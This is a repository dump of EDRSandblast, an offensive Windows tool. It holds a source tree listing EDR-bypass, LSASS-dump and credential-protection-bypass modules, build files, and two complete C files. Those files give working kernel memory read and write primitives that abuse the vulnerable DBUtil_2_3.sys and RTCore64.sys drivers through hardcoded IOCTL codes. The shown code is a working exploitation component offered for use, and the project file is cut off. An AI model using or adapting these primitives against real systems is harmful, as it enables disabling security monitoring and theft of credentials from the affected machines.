Project Path: arc_gmh5225_EDRSandblast_130i81jf

Source Tree:

```txt
arc_gmh5225_EDRSandblast_130i81jf
├── EDRSandblast
│   ├── Drivers
│   │   ├── DriverDBUtil.c
│   │   └── DriverRTCore.c
│   ├── EDRSandBlast.h
│   ├── EDRSandblast.vcxproj
│   ├── EDRSandblast.vcxproj.filters
│   ├── Includes
│   │   ├── CredGuard.h
│   │   ├── DriverDBUtil.h
│   │   ├── DriverOps.h
│   │   ├── DriverRTCore.h
│   │   ├── ETWThreatIntel.h
│   │   ├── FileUtils.h
│   │   ├── FileVersion.h
│   │   ├── FirewallOps.h
│   │   ├── Firewalling.h
│   │   ├── HttpClient.h
│   │   ├── IsEDRChecks.h
│   │   ├── IsElevatedProcess.h
│   │   ├── KernelCallbacks.h
│   │   ├── KernelMemoryPrimitives.h
│   │   ├── KernelPatternSearch.h
│   │   ├── KernelUtils.h
│   │   ├── ListUtils.h
│   │   ├── NtoskrnlOffsets.h
│   │   ├── ObjectCallbacks.h
│   │   ├── PEBBrowse.h
│   │   ├── PEParser.h
│   │   ├── PdbSymbols.h
│   │   ├── ProcessDump.h
│   │   ├── ProcessDumpDirectSyscalls.h
│   │   ├── RemotePEBBrowser.h
│   │   ├── RunAsPPL.h
│   │   ├── SW2_Syscalls.h
│   │   ├── SignatureOps.h
│   │   ├── StringUtils.h
│   │   ├── SyscallProcessUtils.h
│   │   ├── Syscalls.h
│   │   ├── Undoc.h
│   │   ├── Undoc_64.h
│   │   ├── UserlandHooks.h
│   │   ├── WdigestOffsets.h
│   │   └── WindowsServiceOps.h
│   ├── KernellandBypass
│   │   ├── ETWThreatIntel.c
│   │   ├── KernelCallbacks.c
│   │   ├── KernelUtils.c
│   │   └── ObjectCallbacks.c
│   ├── LSASSProtectionBypass
│   │   ├── CredGuard.c
│   │   └── RunAsPPL.c
│   ├── UserlandBypass
│   │   ├── Firewalling.c
│   │   ├── ProcessDumpDirectSyscalls.c
│   │   ├── Syscalls.c
│   │   └── UserlandHooks.c
│   └── Utils
│       ├── DriverOps.c
│       ├── FileUtils.c
│       ├── FileVersion.c
│       ├── FirewallOps.cpp
│       ├── HttpClient.c
│       ├── IsEDRChecks.c
│       ├── IsElevatedProcess.c
│       ├── KernelMemoryPrimitives.c
│       ├── KernelPatternSearch.c
│       ├── ListUtils.c
│       ├── NtoskrnlOffsets.c
│       ├── PEBBrowse.c
│       ├── PEParser.c
│       ├── PdbSymbols.c
│       ├── ProcessDump.c
│       ├── RemotePEBBrowser.c
│       ├── SW2_Syscalls.c
│       ├── SW2_Syscalls_stubs.x64.asm
│       ├── SignatureOps.c
│       ├── StringUtils.c
│       ├── SyscallProcessUtils.c
│       ├── WdigestOffsets.c
│       └── WindowsServiceOps.c
├── EDRSandblast.sln
├── EDRSandblast_CLI
│   ├── EDRSandblast.c
│   ├── EDRSandblast_CLI.vcxproj
│   └── EDRSandblast_CLI.vcxproj.filters
├── EDRSandblast_LsassDump
│   ├── EDRSandblast_LsassDump.c
│   ├── EDRSandblast_LsassDump.vcxproj
│   └── EDRSandblast_LsassDump.vcxproj.filters
├── EDRSandblast_StaticLibrary
│   ├── EDRSandblast_API.c
│   ├── EDRSandblast_API.h
│   ├── EDRSandblast_StaticLibrary.vcxproj
│   └── EDRSandblast_StaticLibrary.vcxproj.filters
├── Offsets
│   ├── ExtractOffsets.py
│   ├── NtoskrnlOffsets.csv
│   ├── WdigestOffsets.csv
│   └── requirements.txt
└── README.md

```

`EDRSandblast.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.2.32616.157
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "EDRSandblast_Core", "EDRSandblast\EDRSandblast.vcxproj", "{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "EDRSandblast_StaticLibrary", "EDRSandblast_StaticLibrary\EDRSandblast_StaticLibrary.vcxproj", "{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "EDRSandblast_LsassDump", "EDRSandblast_LsassDump\EDRSandblast_LsassDump.vcxproj", "{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}"
	ProjectSection(ProjectDependencies) = postProject
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23} = {3A2FCB56-01A3-41B3-BDAA-B25F45784B23}
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B} = {7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}
	EndProjectSection
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "EDRSandblast_CLI", "EDRSandblast_CLI\EDRSandblast_CLI.vcxproj", "{FFA0FDDE-BE70-49E4-97DE-753304EF1113}"
	ProjectSection(ProjectDependencies) = postProject
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B} = {7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}
	EndProjectSection
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}.Debug|x64.ActiveCfg = Debug|x64
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}.Debug|x64.Build.0 = Debug|x64
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}.Debug|x86.ActiveCfg = Debug|Win32
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}.Debug|x86.Build.0 = Debug|Win32
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}.Release|x64.ActiveCfg = Release|x64
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}.Release|x64.Build.0 = Release|x64
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}.Release|x86.ActiveCfg = Release|Win32
		{7E3E2ECE-D1EB-43C6-8C83-B52B7571954B}.Release|x86.Build.0 = Release|Win32
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}.Debug|x64.ActiveCfg = Debug|x64
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}.Debug|x64.Build.0 = Debug|x64
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}.Debug|x86.ActiveCfg = Debug|Win32
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}.Debug|x86.Build.0 = Debug|Win32
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}.Release|x64.ActiveCfg = Release|x64
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}.Release|x64.Build.0 = Release|x64
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}.Release|x86.ActiveCfg = Release|Win32
		{3A2FCB56-01A3-41B3-BDAA-B25F45784B23}.Release|x86.Build.0 = Release|Win32
		{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}.Debug|x64.ActiveCfg = Debug|x64
		{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}.Debug|x64.Build.0 = Debug|x64
		{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}.Debug|x86.ActiveCfg = Debug|Win32
		{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}.Debug|x86.Build.0 = Debug|Win32
		{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}.Release|x64.ActiveCfg = Release|x64
		{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}.Release|x64.Build.0 = Release|x64
		{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}.Release|x86.ActiveCfg = Release|Win32
		{04DFB6E4-809E-4C35-88A1-2CC5F1EBFEBD}.Release|x86.Build.0 = Release|Win32
		{FFA0FDDE-BE70-49E4-97DE-753304EF1113}.Debug|x64.ActiveCfg = Debug|x64
		{FFA0FDDE-BE70-49E4-97DE-753304EF1113}.Debug|x64.Build.0 = Debug|x64
		{FFA0FDDE-BE70-49E4-97DE-753304EF1113}.Debug|x86.ActiveCfg = Debug|Win32
		{FFA0FDDE-BE70-49E4-97DE-753304EF1113}.Debug|x86.Build.0 = Debug|Win32
		{FFA0FDDE-BE70-49E4-97DE-753304EF1113}.Release|x64.ActiveCfg = Release|x64
		{FFA0FDDE-BE70-49E4-97DE-753304EF1113}.Release|x64.Build.0 = Release|x64
		{FFA0FDDE-BE70-49E4-97DE-753304EF1113}.Release|x86.ActiveCfg = Release|Win32
		{FFA0FDDE-BE70-49E4-97DE-753304EF1113}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {01A85934-E9FB-4355-846F-667848B78EAF}
	EndGlobalSection
EndGlobal

```

`EDRSandblast/Drivers/DriverDBUtil.c`:

```c
#include <windows.h>
#include <assert.h>
#include <tchar.h>

#include "../EDRSandblast.h"

/*
* "DBUtil_2_3.sys" (SHA256: 0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5)
*/

struct DBUTIL23_MEMORY_READ {
    DWORD64 field0;
    DWORD64 Address;
    DWORD Offset;
    DWORD field14;
    BYTE Buffer[1];
};

struct DBUTIL23_MEMORY_WRITE {
    DWORD64 field0;
    DWORD64 Address;
    DWORD Offset;
    DWORD field14;
    BYTE Buffer[1];
};

static const DWORD DBUTIL23_MEMORY_READ_CODE = 0x9B0C1EC4;
static const DWORD DBUTIL23_MEMORY_WRITE_CODE = 0x9B0C1EC8;

static_assert(offsetof(struct DBUTIL23_MEMORY_READ, Buffer) == 0x18, "sizeof DBUTIL23_MEMORY_READ must be 0x18 bytes");
static_assert(offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) == 0x18, "sizeof DBUTIL23_MEMORY_WRITE must be 0x18 bytes");

HANDLE g_Device_DBUtil = INVALID_HANDLE_VALUE;
HANDLE GetDriverHandle_DBUtil() {
    if (g_Device_DBUtil == INVALID_HANDLE_VALUE) {
        TCHAR service[] = TEXT("\\\\.\\DBUtil_2_3");
        HANDLE Device = CreateFile(service, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

        if (Device == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[!] Unable to obtain a handle to the vulnerable driver, exiting...\n"));
            exit(EXIT_FAILURE);
        }
        g_Device_DBUtil = Device;
    }

    return g_Device_DBUtil;
}

VOID CloseDriverHandle_DBUtil() {
    CloseHandle(g_Device_DBUtil);
    g_Device_DBUtil = INVALID_HANDLE_VALUE;
}



VOID ReadMemoryPrimitive_DBUtil(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    struct DBUTIL23_MEMORY_READ* ReadCommand = calloc(1, Size + sizeof(struct DBUTIL23_MEMORY_READ));
    if (!ReadCommand) {
        _putts_or_not(TEXT("Allocation failed, aborting...\n"));
        exit(1);
    }
    ReadCommand->Address = Address;
    ReadCommand->Offset = 0;
    
    DWORD BytesReturned;

    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }

    DeviceIoControl(GetDriverHandle_DBUtil(),
        DBUTIL23_MEMORY_READ_CODE,
        ReadCommand,
        offsetof(struct DBUTIL23_MEMORY_READ, Buffer) + (DWORD)Size,
        ReadCommand,
        offsetof(struct DBUTIL23_MEMORY_READ, Buffer) + (DWORD)Size,
        &BytesReturned,
        NULL);
    memcpy(Buffer, ReadCommand->Buffer, Size);
}


VOID WriteMemoryPrimitive_DBUtil(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    struct DBUTIL23_MEMORY_WRITE* WriteCommand = calloc(1, Size + sizeof(struct DBUTIL23_MEMORY_WRITE));
    if (!WriteCommand) {
        _putts_or_not(TEXT("Allocation failed, aborting...\n"));
        exit(1);
    }
    WriteCommand->Address = Address;
    WriteCommand->Offset = 0;

    DWORD BytesReturned;

    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }

    memcpy(WriteCommand->Buffer, Buffer, Size);
    DeviceIoControl(GetDriverHandle_DBUtil(),
        DBUTIL23_MEMORY_WRITE_CODE,
        WriteCommand,
        offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
        WriteCommand,
        offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
        &BytesReturned,
        NULL);
}


```

`EDRSandblast/Drivers/DriverRTCore.c`:

```c
#include <windows.h>
#include <assert.h>
#include <tchar.h>

#if NO_STRINGS
#define _putts_or_not(...)
#define _tprintf_or_not(...)
#define wprintf_or_not(...)
#define printf_or_not(...)
#pragma warning(disable : 4189)

#else
#define _putts_or_not(...) _putts(__VA_ARGS__)
#define _tprintf_or_not(...) _tprintf(__VA_ARGS__)
#define printf_or_not(...) printf(__VA_ARGS__)
#define wprintf_or_not(...) wprintf(__VA_ARGS__)
#endif

/*
* "RTCore64.sys" (SHA256: 01AA278B07B58DC46C84BD0B1B5C8E9EE4E62EA0BF7A695862444AF32E87F1FD)
*/

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    DWORD Pad1;
    DWORD Offset;
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    DWORD Pad1;
    DWORD Offset;
    DWORD WriteSize;
    DWORD Value;
    BYTE Pad3[16];
};

static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

static_assert(sizeof(struct RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
static_assert(sizeof(struct RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

HANDLE g_Device_RTCore = INVALID_HANDLE_VALUE;
HANDLE GetDriverHandle_RTCore() {
    if (g_Device_RTCore == INVALID_HANDLE_VALUE) {
        TCHAR service[] = TEXT("\\\\.\\RTCore64");
        HANDLE Device = CreateFile(service, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

        if (Device == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[!] Unable to obtain a handle to the vulnerable driver, exiting...\n"));
            exit(EXIT_FAILURE);
        }
        g_Device_RTCore = Device;
    }

    return g_Device_RTCore;
}

VOID CloseDriverHandle_RTCore() {
    CloseHandle(g_Device_RTCore);
    g_Device_RTCore = INVALID_HANDLE_VALUE;
}



VOID ReadMemoryPrimitive_RTCore(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    while (Size) {
        struct RTCORE64_MEMORY_READ ReadCommand = { 0 };
        ReadCommand.Address = Address;
        if (Size >= 4) {
            ReadCommand.ReadSize = 4;
        }
        else if (Size >= 2) {
            ReadCommand.ReadSize = 2;
        }
        else {
            ReadCommand.ReadSize = 1;
        }
        ReadCommand.Offset = 0;

        DWORD BytesReturned;

        if (Address < 0x0000800000000000) {
            _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
            exit(1);
        }
        if (Address < 0xFFFF800000000000) {
            _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
            exit(1);
        }

        DeviceIoControl(GetDriverHandle_RTCore(),
            RTCORE64_MEMORY_READ_CODE,
            &ReadCommand,
            sizeof(ReadCommand),
            &ReadCommand,
            sizeof(ReadCommand),
            &BytesReturned,
            NULL);

        Address += ReadCommand.ReadSize;
        if (Size >= 4) {
            *(PDWORD)Buffer = (DWORD)ReadCommand.Value;
        }
        else if (Size >= 2) {
            *(PWORD)Buffer = (WORD)ReadCommand.Value;
        }
        else {
            *(PBYTE)Buffer = (BYTE)ReadCommand.Value;
        }
        Size -= ReadCommand.ReadSize;
        Buffer = (PVOID)(((DWORD64)Buffer) + ReadCommand.ReadSize);
    }
}

/*
* RTCore driver allows to write 1, 2 or 4 bytes at a type
*/
VOID WriteMemoryPrimitive_RTCore(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
    while (Size) {
        struct RTCORE64_MEMORY_WRITE WriteCommand = { 0 };
        WriteCommand.Address = Address;
        if (Size >= 4) {
            WriteCommand.WriteSize = 4;
            WriteCommand.Value = *(PDWORD)Buffer;
        }
        else if (Size >= 2) {
            WriteCommand.WriteSize = 2;
            WriteCommand.Value = *(PWORD)Buffer;
        }
        else {
            WriteCommand.WriteSize = 1;
            WriteCommand.Value = *(PBYTE)Buffer;
        }
        WriteCommand.Offset = 0;

        DWORD BytesReturned;

        if (Address < 0x0000800000000000) {
            _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
            exit(1);
        }
        if (Address < 0xFFFF800000000000) {
            _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
            exit(1);
        }

        DeviceIoControl(GetDriverHandle_RTCore  (),
            RTCORE64_MEMORY_WRITE_CODE,
            &WriteCommand,
            sizeof(WriteCommand),
            &WriteCommand,
            sizeof(WriteCommand),
            &BytesReturned,
            NULL);

        Address += WriteCommand.WriteSize;
        Size -= WriteCommand.WriteSize;
        Buffer = (PVOID)(((DWORD64)Buffer) + WriteCommand.WriteSize);
    }
}


```

`EDRSandblast/EDRSandBlast.h`:

```h
#pragma once

//TODO P1 : implement a "clean" mode that only removes the driver if installed
//TODO P2 : replace all instances of exit(1) by a clean_exit() function that uninstalls the driver before exiting
typedef enum _START_MODE {
    dump,
    cmd,
    credguard,
    audit,
    firewall,
    none
} START_MODE;

#define NO_STRINGS 0

#if NO_STRINGS
#define _putts_or_not(...)
#define _tprintf_or_not(...)
#define wprintf_or_not(...)
#define printf_or_not(...)
#pragma warning(disable : 4189)

#else
#define _putts_or_not(...) _putts(__VA_ARGS__)
#define _tprintf_or_not(...) _tprintf(__VA_ARGS__)
#define printf_or_not(...) printf(__VA_ARGS__)
#define wprintf_or_not(...) wprintf(__VA_ARGS__)
#endif
```

`EDRSandblast/EDRSandblast.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{7e3e2ece-d1eb-43c6-8c83-b52b7571954b}</ProjectGuid>
    <RootNamespace>EDRSandblast</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>EDRSandblast_Core</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
    <PreferredToolArchitecture>x64</PreferredToolArchitecture>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <PreferredToolArchitecture>x64</PreferredToolArchitecture>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
    <PreferredToolArchitecture>x64</PreferredToolArchitecture>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <PreferredToolArchitecture>x64</PreferredToolArchitecture>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <IncludePath>$(SolutionDir)EDRSandblast\Includes;$(IncludePath)</IncludePath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <RunCodeAnalysis>false</RunCodeAnalysis>
    <EnableClangTidyCodeAnalysis>true</EnableClangTidyCodeAnalysis>
    <CodeAnalysisRuleSet>AllRules.ruleset</CodeAnalysisRuleSet>
    <IncludePath>$(SolutionDir)EDRSandblast\Includes;$(IncludePath)</IncludePath>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>kernel32.lib;user32.lib;gdi32.lib;Shlwapi.lib;Winhttp.lib;advapi32.lib;dbghelp.lib;version.lib</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>kernel32.lib;user32.lib;gdi32.lib;Shlwapi.lib;Winhttp.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;;advapi32.lib;dbghelp.lib;version.lib</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <AdditionalIncludeDirectories>Includes\</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>kernel32.lib;user32.lib;gdi32.lib;Shlwapi.lib;Winhttp.lib;Pathcch.lib;advapi32.lib;dbghelp.lib;version.lib</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <AdditionalIncludeDirectories>Includes\;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <TreatWarningAsError>true</TreatWarningAsError>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <AdditionalDependencies>kernel32.lib;user32.lib;gdi32.lib;Shlwapi.lib;Winhttp.lib;Pathcch.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;;advapi32.lib;dbghelp.lib;version.lib</AdditionalDependencies>
      <ProgramDatabaseFile />
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="Drivers\DriverDBUtil.c" />
    <ClCompile Include="Drivers\DriverRTCore.c" />
    <ClCompile Include="KernellandBypass\ETWThreatIntel.c" />
    <ClCompile Include="KernellandBypass\KernelCallbacks.c" />
    <ClCompile Include="KernellandBypass\KernelUtils.c" />
    <ClCompile Include="KernellandBypass\ObjectCallbacks.c" />
    <ClCompile Include="UserlandBypass\Syscalls.c" />
    <ClCompile Include="UserlandBypass\ProcessDumpDirectSyscalls.c" />
    <ClCompile Include="Utils\FileUtils.c" />
    <ClCompile Include="Utils\HttpClient.c" />
    <ClCompile Include="LSASSProtectionBypass\CredGuard.c" />
    <ClCompile Include="LSASSProtectionBypass\RunAsPPL.c" />
    <ClCompile Include="Utils\ListUtils.c" />
    <ClCompile Include="Utils\RemotePEBBrowser.c" />
    <ClCompile Include="Utils\PdbSymbols.c" />
    <ClCompile Include="UserlandBypass\Firewalling.c" />
    <ClCompile Include="UserlandBypass\UserlandHooks.c" />
    <ClCompile Include="Utils\DriverOps.c" />
    <ClCompile Include="Utils\FileVersion.c" />
    <ClCompile Include="Utils\FirewallOps.cpp" />
    <ClCompile Include="Utils\IsEDRChecks.c" />
    <ClCompile Include="Utils\IsElevatedProcess.c" />
    <ClCompile Include="Utils\KernelMemoryPrimitives.c" />
    <ClCompile Include="Utils\KernelPatternSearch.c" />
    <ClCompile Include="Utils\ProcessDump.c" />
    <ClCompile Include="Utils\NtoskrnlOffsets.c" />
    <ClCompile Include="Utils\PEBBrowse.c" />
    <ClCompile Include="Utils\PEParser.c" />
    <ClCompile Include="Utils\StringUtils.c" />
    <ClCompile Include="Utils\SignatureOps.c" />
